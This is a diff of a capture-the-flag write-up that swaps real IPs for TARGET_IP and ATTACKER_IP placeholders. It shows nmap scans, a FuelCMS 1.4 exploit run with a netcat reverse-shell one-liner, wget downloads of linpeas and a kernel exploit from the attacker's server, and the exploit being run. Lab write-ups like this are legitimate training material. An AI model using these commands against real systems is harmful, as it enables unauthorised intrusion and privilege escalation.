@@ -20,15 +20,15 @@ $ sudo openvpn --config NovusEdge.ovpn
 Running some basic `nmap` scans:
 
 ```shell-session
-$ sudo nmap -sS -vv -p- -oN nmap_stealth_scan.txt 10.10.97.204
+$ sudo nmap -sS -vv -p- -oN nmap_stealth_scan.txt TARGET_IP
 PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 63
 
-$ sudo nmap -sV -p80 -vv -oN nmap_service_scan.txt 10.10.97.204
+$ sudo nmap -sV -p80 -vv -oN nmap_service_scan.txt TARGET_IP
 PORT   STATE SERVICE REASON         VERSION
 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
 
-$ sudo nmap -sC --script=vuln -vv -oN nmap_vuln_scan.txt 10.10.97.204
+$ sudo nmap -sC --script=vuln -vv -oN nmap_vuln_scan.txt TARGET_IP
 PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 63
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
@@ -89,13 +89,13 @@ Checking ExploitDB for some existing exploits for _FuelCMS version 1.4_ shows us
 ```shell-session
 $ python3 50477.py -u http://10.10.53.109/        
 [+]Connecting...
-Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.45.44 4444 >/tmp/f
+Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 
 
 # On our machine (in a different session):
 $ nc -nvlp 4444         
 listening on [any] 4444 ...
-connect to [10.14.45.44] from (UNKNOWN) [10.10.53.109] 44732
+connect to [ATTACKER_IP] from (UNKNOWN) [10.10.53.109] 44732
 sh: 0: can't access tty; job control turned off
 
 $ python -c "import pty; pty.spawn('/bin/bash')"      
@@ -139,7 +139,7 @@ $ python3 -m http.server 8080
 
 # On the target machine shell session:
 www-data@ubuntu:/home/www-data$ cd /tmp
-www-data@ubuntu:/tmp$ wget http://10.14.45.44:8080/linpeas.sh
+www-data@ubuntu:/tmp$ wget http://ATTACKER_IP:8080/linpeas.sh
 www-data@ubuntu:/tmp$ sh linpeas.sh
 ...
 
@@ -156,9 +156,9 @@ I once again searched ExploitDB and came across [this exploit](https://www.explo
 
 ```
 
-www-data@ubuntu:/tmp$ wget http://10.14.45.44:8080/evil-so.c
-www-data@ubuntu:/tmp$ wget http://10.14.45.44:8080/exploit.c
-www-data@ubuntu:/tmp$ wget http://10.14.45.44:8080/Makefile
+www-data@ubuntu:/tmp$ wget http://ATTACKER_IP:8080/evil-so.c
+www-data@ubuntu:/tmp$ wget http://ATTACKER_IP:8080/exploit.c
+www-data@ubuntu:/tmp$ wget http://ATTACKER_IP:8080/Makefile
 www-data@ubuntu:/tmp$ make
 ...
 www-data@ubuntu:/tmp$ ./exploit
